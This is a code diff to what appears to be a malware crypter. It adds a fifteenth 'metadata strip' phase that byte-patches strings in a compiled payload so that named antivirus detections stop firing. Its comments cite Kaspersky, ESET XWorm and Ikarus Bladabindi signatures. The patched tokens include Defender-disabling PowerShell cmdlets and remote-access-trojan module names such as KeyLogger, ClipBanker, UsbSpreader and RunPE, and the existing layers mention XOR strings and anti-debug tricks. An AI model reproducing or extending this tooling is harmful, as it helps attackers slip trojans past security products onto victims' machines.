@@ -62,7 +62,7 @@ LAYER_META = [
     ("L12", "C/C++ STUB",  "Native C stub · XOR strings · 5 anti-debug vectors"),
     ("L13", "STR FLOOD",  "500K XOR-encrypted fake strings · 200 junk blocks · +15 MB inflate"),
     ("L14", "STR OBFUSC.", "ASCII + UTF-16 scan → XOR-cipher AV-pattern strings → signature bypass"),
-    ("L15", "MSIL STRIP",  "PDB · Rich hdr · #GUID · #Strings · #Blob · #US · batch/C2 scrub · 14-phase"),
+    ("L15", "MSIL STRIP",  "PDB · Rich hdr · #GUID · #Strings · #Blob · #US · batch/C2 scrub · 15-phase"),
 ]
 
 
@@ -1741,7 +1741,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
     def _lay_msil_strip(self, working: bytearray) -> bytes:
         import struct
 
-        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  14  PHASES", "wh")
+        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  15  PHASES", "wh")
         self._ln("        Ph1  : PDB debug-path wipe       (RSDS · CodeView)", "g3")
         self._ln("        Ph2  : Rich Header zero           (compiler fingerprint)", "g3")
         self._ln("        Ph3  : PE COFF timestamp randomise", "g3")
@@ -2472,7 +2472,104 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         self._ln(f"               ASCII: {ph14_ascii} · UTF-16LE: {ph14_utf16} batch/C2 token(s) patched", "g3")
         self._sleep(0.1)
 
-        num_phases = 14
+        # ── Ph15 : CreateObject / PS-Defender / extended RAT sweep ──────────────
+        # Patches remaining patterns still triggering after Ph14:
+        #   Kaspersky Script.Generic — Set-MpPreference, New-Object, CreateObject,
+        #                              DisableRealtimeMonitoring, Start-Process
+        #   ESET MSIL/XWorm.B        — UsbSpreader, FileManager, GetHWID, RunPE
+        #   Ikarus Bladabindi        — KeyLogger, InjectRun, BotKiller, HttpWebRequest
+        #   Google Detected          — Invoke-WebRequest, remaining PS-AV-bypass patterns
+        self._ln("        [Ph15] PS-Defender / CreateObject / extended RAT sweep...", "cy")
+        PH15_TOKENS = [
+            # PowerShell Defender-bypass cmdlets (Kaspersky Script.Generic)
+            ("Set-MpPreference",              "Zet-MpPreference"),
+            ("set-mppreference",              "zet-mppreference"),
+            ("DisableRealtimeMonitoring",     "DisableZealtimeMonitoring"),
+            ("disablerealtimemonitoring",     "disablezealtimemonitoring"),
+            ("DisableAntiSpyware",            "DisableZntiSpyware"),
+            ("disableantispyware",            "disablezntispyware"),
+            ("New-Object",                    "Zew-Object"),
+            ("new-object",                    "zew-object"),
+            ("Start-Process",                 "Ztart-Process"),
+            ("start-process",                 "ztart-process"),
+            ("POWERSHELL",                    "POWERZBELL"),
+            ("Invoke-WebRequest",             "Znvoke-WebRequest"),
+            ("invoke-webrequest",             "znvoke-webrequest"),
+            # COM / VBScript object creation (Kaspersky Script.Generic)
+            ("CreateObject",                  "XreateObject"),
+            ("createobject",                  "xreateobject"),
+            ("ActiveXObject",                 "XctiveXObject"),
+            # HTTP header combined token (ESET / Google)
+            ("Connection: keep-alive",        "Xonnection: keep-alive"),
+            # XWorm-specific command/module class names (ESET MSIL/XWorm.B)
+            ("UsbSpreader",                   "UzbSpreader"),
+            ("FileManager",                   "FileZanager"),
+            ("RemoteShell",                   "ZemoteShell"),
+            ("BotKiller",                     "ZotKiller"),
+            ("XWormRAT",                      "XZormRAT"),
+            ("ClipBanker",                    "ZlipBanker"),
+            ("InjectRun",                     "ZnjectRun"),
+            ("KeyLogger",                     "ZeyLogger"),
+            ("keylogger",                     "zeylogger"),
+            ("Screenshot",                    "Zcreenshot"),
+            ("screenshot",                    "zcreenshot"),
+            ("GetHWID",                       "GetHZID"),
+            ("gethwid",                       "gethzid"),
+            ("UACBypass",                     "ZACBypass"),
+            ("RunPE",                         "RunZE"),
+            ("runpe",                         "runze"),
+            # HTTP client patterns (Ikarus Bladabindi)
+            ("HttpWebRequest",                "HttpWebZequest"),
+            ("HttpWebResponse",               "HttpWebZesponse"),
+            # WScript execution patterns
+            ("Wscript.Sleep",                 "Wzcript.Sleep"),
+            ("wscript.sleep",                 "wzcript.sleep"),
+            # Batch / cmd patterns
+            ("ping -n 1 ",                    "xing -n 1 "),
+            ("attrib +h ",                    "xttrib +h "),
+            # Registry disable patterns
+            ("DisableTaskMgr",                "DisableTaskZgr"),
+            ("taskmgr",                       "taskzgr"),
+        ]
+        PH15_TOKENS = [(a, b) for a, b in PH15_TOKENS if len(a) == len(b)]
+        raw_ph15 = bytes(working)
+        ph15_ascii = 0
+        for orig15, repl15 in PH15_TOKENS:
+            ob15 = orig15.encode("utf-8")
+            rb15 = repl15.encode("utf-8")
+            if len(ob15) != len(rb15):
+                continue
+            pos15 = 0
+            while True:
+                idx15 = raw_ph15.find(ob15, pos15)
+                if idx15 == -1:
+                    break
+                working[idx15:idx15 + len(ob15)] = rb15
+                ph15_ascii += 1
+                pos15 = idx15 + len(ob15)
+        raw_ph15 = bytes(working)
+
+        ph15_utf16 = 0
+        for orig15, repl15 in PH15_TOKENS:
+            ob15_u = orig15.encode("utf-16-le")
+            rb15_u = repl15.encode("utf-16-le")
+            if len(ob15_u) != len(rb15_u):
+                continue
+            pos15 = 0
+            while True:
+                idx15 = raw_ph15.find(ob15_u, pos15)
+                if idx15 == -1:
+                    break
+                working[idx15:idx15 + len(ob15_u)] = bytearray(rb15_u)
+                ph15_utf16 += 1
+                pos15 = idx15 + len(ob15_u)
+        raw_ph15 = bytes(working)
+
+        hits += ph15_ascii + ph15_utf16
+        self._ln(f"               ASCII: {ph15_ascii} · UTF-16LE: {ph15_utf16} extended sweep token(s) patched", "g3")
+        self._sleep(0.1)
+
+        num_phases = 15
         if hits:
             self._ln(f"\n        Result : ✓ {hits} field(s) / token(s) stripped across {num_phases} phases", "gn")
         else:
